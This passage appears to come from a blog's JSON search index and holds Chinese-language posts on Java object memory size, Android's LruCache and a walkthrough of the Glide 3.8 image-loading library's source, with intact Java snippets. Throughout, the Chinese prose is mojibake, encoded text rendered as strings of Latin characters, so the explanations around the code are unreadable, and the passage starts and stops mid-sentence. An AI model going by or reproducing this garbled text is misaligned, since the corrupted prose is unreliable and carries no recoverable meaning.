Stringâ€è¿™9ä¸ªå­—ç¬¦ï¼ˆ36bytesï¼‰ã€‚ä¸Šé¢æåˆ°çš„è¿™äº›é›†åˆç±»éƒ½å¯¹å¤–æä¾›äº†å¯ä»¥è®¾ç½®åˆå§‹å®¹é‡çš„æ„é€ å‡½æ•°ä»¥é¿å…å†…å­˜æµªè´¹ï¼Œä½†è¦æ³¨æ„HashMapåªæ¥å—2çš„æŒ‡æ•°å¹‚ã€‚ 7.high levelæŠ½è±¡å¸¦æ¥çš„ä¾¿åˆ©æ€§åŠæ‰€éœ€ä»˜å‡ºçš„ä»£ä»·é¢å‘å¯¹è±¡è¯­è¨€æ¨èå¼€å‘è€…ä½¿ç”¨ä¸€äº›é«˜å±‚æŠ½è±¡åŒ–çš„ç±»ï¼Œä½†æ›´åŠ å¤æ‚çš„åŠŸèƒ½æ„å‘³ç€å†…å­˜å ç”¨çš„å¢åŠ ã€‚è€Œå†…å­˜æ„å‘³ç€ä¸€åˆ‡ï¼Œæ‰€ä»¥ï¼Œæƒè¡¡å¥½å¼€å‘ä¾¿åˆ©ä¸å†…å­˜å ç”¨å¯¹äºç¨‹åºçš„é«˜æ•ˆè¿è¡Œå°±ååˆ†é‡è¦ï¼Œè€Œè¿™ä¸€åˆ‡çš„å‰æå°±åœ¨äºäº†è§£è¿™äº›Wrapperå¯¹è±¡å·¥ä½œçš„åŸç†ã€‚ ä¸€äº›å¾ˆæœ‰æ„æ€çš„äº‹æƒ… Integerå†…éƒ¨ç¼“å­˜äº†ä¸€ä¸ªInteger[] ï¼Œæœ€å¤§å€¼å¯ä»¥é€šè¿‡(java.lang.Integer.IntegerCache.high)é…ç½® ä¸åŒç‰ˆæœ¬jdkä¸ŠStringçš„ä¼˜åŒ–å¾ˆæœ‰æ„æ€ï¼Œåˆæ˜¯é‚£ä¸ªä¸€ä¸ªStringå ç”¨å¤šå°‘å­—èŠ‚çš„é—®é¢˜ å…³äºConcurrentModificationExceptionï¼Œå¯¹ä¸€ä¸ªé›†åˆçš„æ›´æ”¹åˆ†ä¸ºç»“æ„æ€§æ›´æ”¹å’Œé›†åˆå…ƒç´ å€¼çš„æ›´æ”¹ï¼Œå‰è€…ä¼šæŠ›å‡ºConcurrentModificationExceptionï¼Œåè€…ä¸ä¼šã€‚ å‚è€ƒ JAVA å¯¹è±¡å¤§å° ä¸€ä¸ªJavaå¯¹è±¡åˆ°åº•å ç”¨å¤šå¤§å†…å­˜ æŸ¥çœ‹ Java å¯¹è±¡å¤§å° From Java code to Java heap Understanding the Memory Usage of Your Application Thanks for the memory, Linux booleanæ•°ç»„ä¸­ä¸€ä¸ªå€¼å ç”¨1bit ä¸åŒjdkç‰ˆæœ¬Stringåšçš„ä¼˜åŒ– å¯¹è±¡å¤´é‡Œé¢çš„lockæ˜¯æ€ä¹ˆç”¨çš„ Androidé‡Œé¢çš„ä¸€ä¸ªViewå¤§æ¦‚0.5kbAndroid studio3.0ä¸­ä½¿ç”¨Memory profiler -&gt; dunp java heap -&gt; check Retained Size (èƒ½å¤Ÿçœ‹åˆ°æ¯ä¸ªViewçš„å¤§å°ï¼Œä¸€ä¸ªToolbarå¤§æ¦‚åœ¨18kb) stuart markä¹Ÿæåˆ°äº†æ–‡ä»¶å¤´å¤§å°","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"}]},{"title":"LruCacheé˜…è¯»ç¬”è®°","date":"2017-07-23T19:02:21.000Z","path":"2017/07/23/2017-07-23-lru-cache-and-more/","text":"LruCacheåœ¨android3.1ä¸­åŠ å…¥ï¼Œå³android.util.LruCacheï¼Œä¸»è¦æ˜¯ä½œä¸ºä¸€ç§åˆç†çš„ç¼“å­˜ç­–ç•¥çš„å®ç°ï¼Œç”¨äºæ›¿ä»£åŸæ¥çš„SoftReferenceã€‚v4åŒ…æä¾›äº†static versionçš„å®ç°ï¼Œå³android.support.v4.util.LruCacheã€‚æ­¤å¤–ï¼Œè¿˜æœ‰DiskLruCacheå¯¹åº”ç£ç›˜ç¼“å­˜ï¼Œåœ¨OkHttpå’ŒGlideç­‰å¼€æºé¡¹ç›®ä¸­éƒ½æœ‰ï¼Œå¯ç›´æ¥å¤åˆ¶è¿‡æ¥ï¼Œæ”¹ä¸‹åŒ…åç›´æ¥ç”¨ã€‚è¿™äº›ç±»æœ¬è´¨ä¸Šéƒ½æ˜¯å¯¹äºLeast Recently Usedç®—æ³•çš„å®ç°ã€‚ç¨å¾®çœ‹äº†ä¸‹ç½‘ä¸Šçš„åšå®¢ï¼ŒLruCacheå®é™…ä¸Šå°±æ˜¯åˆ©ç”¨äº†LinkedHashmapçš„accessorderæ¥å®ç°æœ«ä½æ·˜æ±°çš„ã€‚v4åŒ…é‡Œçš„LinkedHashmapå°±æ˜¯java.utilé‡Œé¢çš„,platformé‡Œçš„LinkedHashmapæ·»åŠ äº†ä¸€äº›æ–¹æ³•ã€‚ 1. ä½¿ç”¨å…¥é—¨è¿™æ˜¯æœ€ç®€å•çš„ä¸€ä¸ªç”¨äºç¼“å­˜å›¾ç‰‡Bitmapçš„cacheçš„ç®—æ³• int maxMemory = (int) (Runtime.getRuntime().totalMemory()/1024); int cacheSize = maxMemory/8; mMemoryCache = new LruCache&lt;String,Bitmap&gt;(cacheSize){ @Override protected int sizeOf(String key, Bitmap value) { return value.getRowBytes()*value.getHeight()/1024; } }; è¿™ä¸ªsizeOfå‡½æ•°å¿…é¡»å¤å†™ï¼Œç”¨äºè®¡ç®—å•ä¸ªå…ƒç´ å¤§å°ï¼Œä¸»è¦ä¸ºäº†ç¡®ä¿ç¼“å­˜ä¸è¶…å‡ºæœ€å¤§å®¹é‡ã€‚ 2.ç®€å•ä»‹ç»LruCacheæ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œåœ¨å†…éƒ¨çš„ getã€putã€remove åŒ…æ‹¬ trimToSize éƒ½æ˜¯å®‰å…¨çš„ï¼ˆå› ä¸ºéƒ½ä¸Šé”äº†ï¼‰ ç®€ä¹¦ä½œè€…å†™çš„æ¯”è¾ƒå¥½è¿™ç§é“¾è¡¨æœ€å¥½ç»“åˆç€å›¾æ¥çœ‹ HashMapåªæ˜¯ä¸€ä¸ªHashMap.Nodeçš„æ•°ç»„ï¼Œå› ä¸ºHash Collisionäº§ç”Ÿé“¾è¡¨ï¼ˆå•å‘ï¼Œé€šè¿‡Node.nextå®ç°ï¼‰LinkedHashMap extends HashMapã€‚ åŸºæœ¬å…ƒç´ æ˜¯LinkedHashMap.Entry(extends HashMap.Nodeï¼Œç»§æ‰¿ä¸è¿‡æ˜¯æ·»åŠ äº†beforeå’Œafterçš„Entry)ï¼Œç”±æ­¤åœ¨HashMapçš„åŸºç¡€ä¸Šå†æ„é€ äº†ä¸€ä¸ªåŒå‘å¾ªç¯é“¾è¡¨ã€‚ LinkedHashMapç»§æ‰¿HashMapä¹‹åä¸»è¦Overrideäº†å‡ ä¸ªHashMapé¢„ç•™çš„å›è°ƒå‡½æ•°ã€‚afterNodeAccess(æŠŠæœ€è¿‘ç”¨è¿‡çš„å…ƒç´ æŒªåˆ°åŒå‘é“¾è¡¨çš„å°¾éƒ¨),afterNodeInsertionï¼ŒafterNodeRemovalç­‰ä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯æ¬¡CRUDæ“ä½œéƒ½ä¼šæŠŠæœ€è¿‘ä½¿ç”¨è¿‡çš„å…ƒç´ æŒªåˆ°æœ€ä¸Šé¢(ä¸ä¸€å®šå‡†ç¡®ï¼Œå¤§è‡´è¿™ä¸ªæ„æ€)ï¼Œè€Œä¸”è¿™é¡¹æ“ä½œåªä¸è¿‡æ˜¯æŒªä¸€ä¸‹æŒ‡é’ˆï¼Œå¹¶ä¸è´¹äº‹ å‚è€ƒ å½»åº•è§£æAndroidç¼“å­˜æœºåˆ¶â€”â€”LruCache Androidæºç è§£æâ€”â€”LruCache LruCache æºç è§£æ LRU ç¼“å­˜å®ç°( Java ) pythonè¿™è¾¹æœ‰ä¸€ä¸ªåŸºäºasync ioçš„å®ç°","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"ä»glideæºç åˆ°å›¾ç‰‡åŠ è½½æ¡†æ¶è®¾è®¡æ€è·¯","date":"2017-07-21T00:13:02.000Z","path":"2017/07/21/2017-07-21-glide-decoded/","text":"glideçš„æºç å‡ ä¸ªæœˆå‰æ›¾ç»æ‹œè¯»è¿‡ï¼Œå¤§è‡´äº†è§£äº†å…¶å¼‚æ­¥åŠ è½½çš„å®ç°åŸç†ã€‚å›¾ç‰‡åŠ è½½å’Œç½‘ç»œè¯·æ±‚å¾ˆç±»ä¼¼ï¼Œå°±åƒå½“åˆçœ‹Volleyï¼Œä»ä¸€ä¸ªRequest â€”&gt; CacheDispatch â€”&gt; NetworkDispatcher â€”-&gt; ResponseDeliverã€‚ä¼˜ç§€çš„è½®å­ä¸ä»…æ‰§è¡Œæ•ˆç‡é«˜ï¼ŒåŒæ—¶å…·å¤‡é«˜çš„æ‰©å±•æ€§ã€‚è¯»æ‡‚æºç å…¶å®åªæ˜¯ç¬¬ä¸€æ­¥ï¼Œå¾€ä¸‹åº”è¯¥æ˜¯åˆ©ç”¨æ¡†æ¶æä¾›çš„æ‰©å±•æ–¹æ¡ˆï¼Œå†å¾€ååº”è¯¥å°±æ˜¯èƒ½å¤Ÿç‹¬ç«‹è®¾è®¡å‡ºä¸€å¥—ç±»ä¼¼çš„æ¡†æ¶äº†ã€‚å†™è¿™ç¯‡æ–‡ç« æ—¶ï¼ŒGlideçš„ç‰ˆæœ¬æ˜¯3.8 1. ä½¿ç”¨å…¥é—¨å°è±¡ä¸­æœ€æ—©æ¥è§¦Glideæ˜¯åœ¨cheesequareä¸­ï¼Œé¡¿æ—¶å‘ç°ï¼ŒåŸæ¥åŠ è½½å›¾ç‰‡å¯ä»¥è¿™ä¹ˆç®€å•ï¼Œä¹‹åçš„å¼€å‘è¿‡ç¨‹ä¸­æ€»ä¼šå¯¹Glideæœ‰æ‰€åå€šã€‚æ¥è¿‘ä¸¤å¹´ä¹‹åå†æ¥è¿‡ä¸€éæºç ï¼Œå¸Œæœ›èƒ½å¤Ÿå›ç­”é‚£ä¸ªâ€œå¦‚æœè®©ä½ æ¥è®¾è®¡ä¸€ä¸ªå›¾ç‰‡åŠ è½½æ¡†æ¶ï¼Œä½ ä¼šæ€ä¹ˆè®¾è®¡ï¼Ÿâ€çš„é—®é¢˜ã€‚ä½¿ç”¨æ–¹å¼å¾ˆç®€å• Glide.with(activity) .load(R.drawable.image_id) .into(mImageView); æ¥çœ‹è¿™é‡Œé¢åšäº†ä»€ä¹ˆï¼š public RequestManager get(FragmentActivity activity) { if (Util.isOnBackgroundThread()) { return get(activity.getApplicationContext()); } else { assertNotDestroyed(activity); FragmentManager fm = activity.getSupportFragmentManager(); return supportFragmentGet(activity, fm); } } SupportRequestManagerFragment getSupportRequestManagerFragment(final FragmentManager fm) { SupportRequestManagerFragment current = (SupportRequestManagerFragment) fm.findFragmentByTag( FRAGMENT_TAG); if (current == null) { current = pendingSupportRequestManagerFragments.get(fm); if (current == null) { current = new SupportRequestManagerFragment(); pendingSupportRequestManagerFragments.put(fm, current); fm.beginTransaction().add(current, FRAGMENT_TAG).commitAllowingStateLoss(); handler.obtainMessage(ID_REMOVE_SUPPORT_FRAGMENT_MANAGER, fm).sendToTarget(); } } return current; } withæ–¹æ³•åªæ˜¯è¿”å›äº†ä¸€ä¸ªRequestManagerï¼Œwithæ–¹æ³•å¯ä»¥æ¥å—Fragment,Activityä»¥åŠContextç­‰.ä»¥ä¸Šé¢çš„activityä¸ºä¾‹ï¼ŒsupportFragmentGetæ–¹æ³•åªæ˜¯é€šè¿‡FragmentActivityçš„supportFragmentManagerå»findFragmentByTagï¼Œè¿™ä¸ªTagå«åšï¼šâ€œcom.bumptech.glide.managerâ€ï¼Œæ‰€ä»¥ä¸€èˆ¬åœ¨Debugçš„æ—¶å€™ï¼Œå»SupportFragmentManageré‡Œé¢æŸ¥æ‰¾ï¼Œæœ‰æ—¶å€™èƒ½å¤Ÿçœ‹åˆ°ä¸€ä¸ªè¿™æ ·çš„Fragmentã€‚è¿™ä¸ªæ–¹æ³•é‡Œé¢å°±æ˜¯æŸ¥æ‰¾è¿™æ ·çš„ä¸€ä¸ªFragmentï¼Œç”šè‡³æˆ‘ä»¬è‡ªå·±ä¹Ÿå¯ä»¥FindFragmentByTagå»è°ƒç”¨è¿™ä¸ªFragmentçš„æ–¹æ³•(è¿™æ˜¯ä¸€ä¸ªPublicçš„class)ç„¶åä»è¿™ä¸ªFragmenté‡Œé¢è·å¾—RequestManageræˆå‘˜å˜é‡ï¼ˆæ²¡æœ‰å°±newä¸€ä¸ªå¹¶setï¼‰ã€‚å¯ä»¥çœ‹å‡ºï¼Œä¸€ä¸ªFragmentåªæœ‰ä¸€ä¸ªRequestManagerï¼ŒFragmentä¸»è¦æ˜¯ä¸ºäº†è·ŸActivityç”Ÿå‘½å‘¨æœŸæŒ‚é’©çš„ã€‚è¿™é‡Œæœ‰å¿…è¦è®²ä¸€ä¸‹ä¸ºä»€ä¹ˆè¦å†™ä¸¤æ¬¡current ==nullï¼ŒfindFragmentByTagå¹¶ä¸ä¼šåœ¨commitAllowingStateLossä¹‹åå°±ä¼šè¿”å›æ·»åŠ çš„Fragmentï¼Œåªæ˜¯å¾€ä¸»çº¿ç¨‹çš„MessageQueueé‡Œé¢ä¸¢äº†ä¸€ä¸ªæ¶ˆæ¯ï¼Œè¿™ä¸ªæ¶ˆæ¯æ‰§è¡Œå®Œæ¯•ä¹‹åæ‰findFragmentByTagæ‰ä¸ä¸ºç©ºã€‚è¿™é‡Œç”¨Handlerä¸¢ä¸€æ¡æ¶ˆæ¯ï¼Œè¿™æ¡æ¶ˆæ¯è‚¯å®šè¦æ’åœ¨ä¹‹å‰é‚£æ¡æ¶ˆæ¯ä¹‹åæ‰è¢«æ‰§è¡Œï¼Œæ‰€ä»¥æ‰æœ‰è¿™æ ·ä¸€ä¸ªPendingmapçš„è®¾è®¡ã€‚å½“ç„¶åˆ°è¿™é‡Œï¼Œæœ€é‡è¦çš„è¿˜æ˜¯Glideæ˜¯é€šè¿‡commitäº†ä¸€ä¸ªç‰¹æ®Šçš„Fragmentæ¥å®ç°ç”Ÿå‘½å‘¨æœŸç›‘å¬ã€‚å…·ä½“æ¥çœ‹ï¼šSupportRequestManagerFragmentä¸­ @Override public void onStart() { super.onStart(); lifecycle.onStart(); } @Override public void onStop() { super.onStop(); lifecycle.onStop(); } @Override public void onDestroy() { super.onDestroy(); lifecycle.onDestroy(); } è€Œå¯¹åº”åˆ°LifeCycleçš„å„ä¸ªæ–¹æ³•ï¼š void onStart() { isStarted = true; for (LifecycleListener lifecycleListener : Util.getSnapshot(lifecycleListeners)) { lifecycleListener.onStart(); } } void onStop() { isStarted = false; for (LifecycleListener lifecycleListener : Util.getSnapshot(lifecycleListeners)) { lifecycleListener.onStop(); } } void onDestroy() { isDestroyed = true; for (LifecycleListener lifecycleListener : Util.getSnapshot(lifecycleListeners)) { lifecycleListener.onDestroy(); } } å°±æ˜¯æŠŠå†…éƒ¨ç»´æŠ¤çš„ä¸€ä¸ªé›†åˆä¸€ä¸ªä¸ªæ‹¿å‡ºæ¥è°ƒç”¨å“åº”ç”Ÿå‘½å‘¨æœŸçš„æ–¹æ³•ã€‚è€Œè¿™ä¸ªLifeCycleListenerå°±æ˜¯ä¸Šé¢åˆ›å»ºRequestManageræ—¶(æ„é€ å‡½æ•°ä¼ è¿›æ¥äº†fragmentçš„lifeCycle)æ·»åŠ çš„ã€‚RequestManagerè¿˜é»˜è®¤æ·»åŠ äº†ä¸€ä¸ªConnectivityMonitorï¼Œä¸»è¦ä½œç”¨å°±æ˜¯åœ¨ç”Ÿå‘½å‘¨æœŸçš„onStartæ³¨å†Œäº†ä¸€ä¸ªConnectivityManager.CONNECTIVITY_ACTIONçš„BroadCastReceiverï¼Œåœ¨onStopçš„æ—¶å€™unRegisterï¼Œåœ¨ç½‘ç»œçŠ¶æ€å˜åŒ–çš„æ—¶å€™è°ƒç”¨RequestManagerçš„RequestTrackeræˆå‘˜å˜é‡çš„restartRequetã€‚ å°ç»“ï¼š åœ¨æœ‰æƒé™(android.permission.ACCESS_NETWORK_STATE)çš„æƒ…å†µä¸‹ï¼ŒGlideå·²ç»åšå¥½äº†æœ‰ç½‘-&gt; æ–­ç½‘-&gt; æœ‰ç½‘çš„æ¢å¤è¯·æ±‚ã€‚å¦å¤–ï¼ŒAndroid 7.0è™½è¯´ä¸å†å‘é€ConnectivityManager.CONNECTIVITY_ACTIONè¿™ä¸ªå¹¿æ’­ï¼Œä½†å¯¹äºå‰å°åº”ç”¨ï¼ŒåŠ¨æ€æ³¨å†Œçš„Receiverè¿˜æ˜¯èƒ½å¤Ÿæ”¶åˆ°ï¼ŒGlideç”±äºæ˜¯åœ¨OnStartæ³¨å†Œçš„ï¼Œæ‰€ä»¥å®Œå…¨æ²¡é—®é¢˜ã€‚ åœ¨ä¸€ä¸ªActivityä¸­ï¼ŒRequestManageråªè¦ä¸€ä¸ªï¼Œå…¶å®å¼€å‘è€…è‡ªå·±ä¿ç•™ä¸‹æ¥ä¹Ÿæ²¡ä»€ä¹ˆé—®é¢˜ 2. RequestManagerè°ƒåº¦è¯·æ±‚æ¥çœ‹ä¸‹è¿™ä¸ªRequestManagerçš„æˆå‘˜å˜é‡ public class RequestManager implements LifecycleListener { private final Context context; private final Lifecycle lifecycle; private final RequestManagerTreeNode treeNode; private final RequestTracker requestTracker; private final Glide glide; //å…¨å±€åªæœ‰ä¸€ä¸ªï¼Œæ§åˆ¶çº¿ç¨‹æ± ï¼Œç”¨Applicationçš„Contextåˆ›å»ºçš„ private final OptionsApplier optionsApplier; private DefaultOptions options; } class OptionsApplier { public &lt;A, X extends GenericRequestBuilder&lt;A, ?, ?, ?&gt;&gt; X apply(X builder) { if (options != null) { options.apply(builder); } return builder; } } ä¸Šé¢è¿™ä¸ªæ³›å‹å†™çš„éå¸¸ç»•ï¼ŒOptionApplierçš„æ„æ€å°±æ˜¯ï¼Œå¦‚æœç”¨æˆ·æä¾›äº†ä¸€äº›å®šåˆ¶(å­˜åœ¨optionsé‡Œé¢)ï¼Œå°±ç»™ä¸€äº›å®šåˆ¶çš„é€‰æ‹©ã€‚ä¸€èˆ¬è¿™ä¸ªoptionsä¸ºnullã€‚ 2.1 å„ç§Typeçš„RequestGlideçš„RequestManagerå¯ä»¥æ¥å—å„ç§å„æ ·çš„æ¥æº public DrawableTypeRequest&lt;Integer&gt; load(Integer resourceId) { return (DrawableTypeRequest&lt;Integer&gt;) fromResource().load(resourceId); } public DrawableTypeRequest&lt;byte[]&gt; load(byte[] model) { return (DrawableTypeRequest&lt;byte[]&gt;) fromBytes().load(model); } public DrawableTypeRequest&lt;File&gt; load(File file) { return (DrawableTypeRequest&lt;File&gt;) fromFile().load(file); } //ä¸Šè¿°æ–¹æ³•éƒ½è°ƒç”¨åˆ°äº† private &lt;T&gt; DrawableTypeRequest&lt;T&gt; loadGeneric(Class&lt;T&gt; modelClass) { ModelLoader&lt;T, InputStream&gt; streamModelLoader = Glide.buildStreamModelLoader(modelClass, context); ModelLoader&lt;T, ParcelFileDescriptor&gt; fileDescriptorModelLoader = Glide.buildFileDescriptorModelLoader(modelClass, context); if (modelClass != null &amp;&amp; streamModelLoader == null &amp;&amp; fileDescriptorModelLoader == null) { throw new IllegalArgumentException(&quot;Unknown type &quot; + modelClass + &quot;. You must provide a Model of a type for&quot; + &quot; which there is a registered ModelLoader, if you are using a custom model, you must first call&quot; + &quot; Glide#register with a ModelLoaderFactory for your custom model class&quot;); } return optionsApplier.apply( new DrawableTypeRequest&lt;T&gt;(modelClass, streamModelLoader, fileDescriptorModelLoader, context, glide, requestTracker, lifecycle, optionsApplier)); } DrawableTypeRequestæ¥å—ä¸€ä¸ªæ³›å‹ï¼Œå¯ä»¥æ˜¯String(ç½‘ç»œè·¯å¾„)ï¼ŒFile(æœ¬åœ°æ–‡ä»¶),Integerï¼ˆèµ„æºæ–‡ä»¶ï¼‰ã€‚æ‰€ä»¥æœ€ç»ˆè¿”å›çš„DrawableTypeRequeté‡Œé¢è£…çš„å¯èƒ½æ˜¯String.classï¼ŒInteger.classä¹Ÿå¯èƒ½æ˜¯File.classã€‚æ¯”è¾ƒéš¾æ‡‚çš„æ˜¯ streamModelLoaderå’ŒfileDescriptorModelLoaderçš„åˆ›å»º. public interface ModelLoader&lt;T, Y&gt; { DataFetcher&lt;Y&gt; getResourceFetcher(T model, int width, int height); } ModelLoaderå…¶å®å°±æ˜¯åªæœ‰ä¸€ä¸ªæ–¹æ³•çš„æ¥å£ï¼Œä¾‹å¦‚with(File)ä¼šä¼ ä¸€ä¸ªFile.classè¿›æ¥ï¼Œè¿”å›çš„streamModelLoaderçš„Tå°±æ˜¯Fileï¼ŒYå°±æ˜¯InputStreamã€‚ModelLoader&lt;T, Y&gt;è´Ÿè´£æä¾›DataFetcherï¼ŒTæ˜¯æ•°æ®æºï¼Œå¯ä»¥æ˜¯File,Resourseï¼Œurlç­‰ç­‰ã€‚Yç”¨äºæè¿°ç±»å‹ï¼Œæœ¬åœ°çš„å°±ä½¿ç”¨ParcelFileDescriptorï¼ˆè®°å¾—FileDescriptorå±äºNativeçš„ä¸œè¥¿ï¼‰ï¼Œç½‘ç»œä¸Šçš„å°±ä½¿ç”¨InputStream.Tå’ŒYçš„ç»„åˆå¯èƒ½æœ‰å¾ˆå¤šç§ï¼ŒCacheåœ¨Glide(å…¨å±€å”¯ä¸€)çš„loaderFactoryï¼ˆæˆå‘˜å˜é‡ï¼‰çš„ä¸€ä¸ªHashMap(æ²¡ç”¨ConcurrentHashMapæ˜¯å› ä¸ºbuildModelLoaderæ–¹æ³•åŠ é”äº†)ä¸­ã€‚æ‰€ä»¥è¿™ä»½ç¼“å­˜ä¹Ÿæ˜¯å…¨å±€å”¯ä¸€çš„ã€‚Tå’ŒYçš„ä¸€ä¸€å¯¹åº”å…¶å®æ˜¯åœ¨Glideçš„æ„é€ å‡½æ•°é‡Œé¢å†™å¥½çš„ï¼š register(File.class, ParcelFileDescriptor.class, new FileDescriptorFileLoader.Factory()); register(File.class, InputStream.class, new StreamFileLoader.Factory()); register(int.class, ParcelFileDescriptor.class, new FileDescriptorResourceLoader.Factory()); register(int.class, InputStream.class, new StreamResourceLoader.Factory()); register(Integer.class, ParcelFileDescriptor.class, new FileDescriptorResourceLoader.Factory()); register(Integer.class, InputStream.class, new StreamResourceLoader.Factory()); register(String.class, ParcelFileDescriptor.class, new FileDescriptorStringLoader.Factory()); register(String.class, InputStream.class, new StreamStringLoader.Factory()); register(Uri.class, ParcelFileDescriptor.class, new FileDescriptorUriLoader.Factory()); register(Uri.class, InputStream.class, new StreamUriLoader.Factory()); register(URL.class, InputStream.class, new StreamUrlLoader.Factory()); register(GlideUrl.class, InputStream.class, new HttpUrlGlideUrlLoader.Factory()); register(byte[].class, InputStream.class, new StreamByteArrayLoader.Factory()); å·¦è¾¹æœ‰å¾ˆå¤šç§ï¼Œå³è¾¹åªå¯èƒ½æ˜¯InputStreamæˆ–è€…ParcelFileDescriptorã€‚ 2.2 Requestçš„ç»§æ‰¿å…³ç³» public class DrawableTypeRequest&lt;ModelType&gt; extends DrawableRequestBuilder&lt;ModelType&gt; implements DownloadOptions public class DrawableRequestBuilder&lt;ModelType&gt; extends GenericRequestBuilder&lt;ModelType, ImageVideoWrapper, GifBitmapWrapper, GlideDrawable&gt; implements BitmapOptions, DrawableOptions public class GenericRequestBuilder&lt;ModelType, DataType, ResourceType, TranscodeType&gt; implements Cloneable è®°ä½è¿™ä¸ªModelTypeå°±æ˜¯Glide.with(context).load(XXX) é‡Œé¢ä¼ è¿›å»çš„Objectçš„Classï¼Œä¾‹å¦‚File.classï¼Œé‚£ä¹ˆä¸Šé¢å…¶å®å°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªDrawableTypeRequestï¼Œæ³›å‹æ˜¯File ï¼Œæ„é€ å‡½æ•°ä¸€å±‚å±‚å¾€ä¸Šè°ƒç”¨ï¼ŒDrawableRequestBuilderè¿™ä¸€å±‚è°ƒç”¨äº†crossFadeæ–¹æ³•ï¼Œå³é»˜è®¤ä¼šæœ‰ä¸€ä¸ªcrossFadeçš„æ•ˆæœï¼Œé»˜è®¤ç”¨çš„æ˜¯DrawableCrossFadeFactoryã€‚æ³¨æ„è¿™é‡ŒæŠŠå±äºRequestManagerçš„RequestTrackerä¹Ÿä¼ è¿›æ¥äº†ã€‚ Glide.with(context).load(XX)åˆ°ç›®å‰ä¸ºæ­¢åªæ˜¯è¿”å›äº†ä¸€ä¸ªDrawableTypeRequest çš„å®ä¾‹ã€‚(è¿˜åœ¨ä¸»çº¿ç¨‹) 2.3 å°ç»“Glide.withè¿”å›ä¸€ä¸ªRequestMangerï¼Œæ¯ä¸ªActivityåªä¼šæœ‰ä¸€ä¸ªRequestManagerloadæ–¹æ³•è¿”å›äº†ä¸€ä¸ªDrawableTypeRequestï¼Œè¿™ä¸ªTå¯èƒ½æ˜¯File,String,Intergerç­‰ã€‚åˆ°ç›®å‰ä¸ºæ­¢è¿˜åªæ˜¯æ„å»ºä¸€ä¸ªRequestã€‚ 3. DrawableRequestBuilderçš„intoæ–¹æ³•Glideçš„æœ€åä¸€ä¸ªè°ƒç”¨æ–¹æ³•æ˜¯into()ï¼Œä¹Ÿæ˜¯æœ€ç»ˆåˆ†å‘è¯·æ±‚çš„æ–¹æ³• DrawableRequestBuilder @Override public Target&lt;GlideDrawable&gt; into(ImageView view) { return super.into(view); } public Target&lt;TranscodeType&gt; into(ImageView view) { Util.assertMainThread();//è¿˜æ˜¯åœ¨ä¸»çº¿ç¨‹å¯¹ä¸å¯¹ if (view == null) { throw new IllegalArgumentException(&quot;You must pass in a non null View&quot;); } if (!isTransformationSet &amp;&amp; view.getScaleType() != null) { switch (view.getScaleType()) { case CENTER_CROP: applyCenterCrop(); break; case FIT_CENTER: case FIT_START: case FIT_END: applyFitCenter(); break; //$CASES-OMITTED$ default: // Do nothing. } } return into(glide.buildImageViewTarget(view, transcodeClass)); //è¿™ä¸ªintoæ¥æ”¶ä¸€ä¸ªTargetçš„å­ç±»çš„å®ä¾‹ï¼Œè€ŒTargetåˆç»§æ‰¿è‡ªLifeCycleListener //è¿™ä¸ªTranscodeClassæ˜¯æ¯ä¸€ä¸ªRequeståˆ›å»ºçš„æ—¶å€™ä»æ„é€ å‡½æ•°ä¼ è¿›æ¥çš„ã€‚ } //transcodeclasså¯èƒ½æ˜¯GlideDrawable.classï¼Œä¹Ÿå¯èƒ½æ˜¯Bitmap.classä¹Ÿå¯èƒ½æ˜¯Drawable.class @SuppressWarnings(&quot;unchecked&quot;) public &lt;Z&gt; Target&lt;Z&gt; buildTarget(ImageView view, Class&lt;Z&gt; clazz) { if (GlideDrawable.class.isAssignableFrom(clazz)) { //isAssignableFromè¡¨ç¤ºå·¦è¾¹çš„classæ˜¯å¦æ˜¯å³è¾¹classä¸€ä¸ªç±»æˆ–è€…çˆ¶ç±»ï¼Œåº”è¯¥å’Œinstaceofå€’è¿‡æ¥ã€‚ return (Target&lt;Z&gt;) new GlideDrawableImageViewTarget(view); } else if (Bitmap.class.equals(clazz)) { return (Target&lt;Z&gt;) new BitmapImageViewTarget(view); } else if (Drawable.class.isAssignableFrom(clazz)) { return (Target&lt;Z&gt;) new DrawableImageViewTarget(view); } else { throw new IllegalArgumentException(&quot;Unhandled class: &quot; + clazz + &quot;, try .as*(Class).transcode(ResourceTranscoder)&quot;); } } GlideDrawableImageViewTargetã€BitmapImageViewTargetä»¥åŠDrawableImageViewTargetå…¨éƒ¨ç»§æ‰¿è‡ªImageViewTargetï¼Œåè€…ç»§æ‰¿è‡ªViewTarget,å†ç»§æ‰¿è‡ªBaseTargetï¼Œå† implements Targetã€‚ä¸€å±‚å±‚ç»§æ‰¿ä¸‹æ¥ï¼ŒGlideDrawableImageViewTargetç­‰ä¸‰ä¸ªå­ç±»ä¸­éƒ½æœ‰ä¸€ä¸ªRequestï¼Œä¸€ä¸ªT extents View(çœ‹æ¥ä¸ä¸€å®šæ˜¯ImageView) 3.1 ä»¥GlideDrawableImageViewTargetä¸ºä¾‹public class GlideDrawableImageViewTarget extends ImageViewTarget&lt;GlideDrawable&gt; { private static final float SQUARE_RATIO_MARGIN = 0.05f; private int maxLoopCount; private GlideDrawable resource; } GlideDrawableæ˜¯ä¸€ä¸ªç»§æ‰¿è‡ªDrawableçš„æŠ½è±¡ç±»ï¼Œæ·»åŠ äº†isAnimated(),setLoopCountä»¥åŠç”±äºå®ç°äº†isAnimatedæ‰€éœ€è¦çš„ä¸‰ä¸ªæ–¹æ³•(start,stop,isRunning)ã€‚å­ç±»å¿…é¡»å®ç°è¿™äº”ä¸ªæŠ½è±¡æ–¹æ³•ã€‚ GlideDrawableImageViewTargetå¾€ä¸Šèµ° public abstract class ImageViewTarget&lt;Z&gt; extends ViewTarget&lt;ImageView, Z&gt; implements GlideAnimation.ViewAdapter{ } æ¥ç€å¾€ä¸Šæ‰¾çˆ¶ç±» public abstract class ViewTarget&lt;T extends View, Z&gt; extends BaseTarget&lt;Z&gt; { private static final String TAG = &quot;ViewTarget&quot;; private static boolean isTagUsedAtLeastOnce = false; private static Integer tagId = null; protected final T view; private final SizeDeterminer sizeDeterminer; } çœ‹ä¸‹æ–‡æ¡£ï¼šA base Target for loading android.graphics.Bitmaps into Views that provides default implementations for most most methods and can determine the size of views using a android.view.ViewTreeObserver.OnDrawListenerTo detect View} reuse in android.widget.ListView or any android.view.ViewGroup that reuses views, this class uses the View setTag(Object) 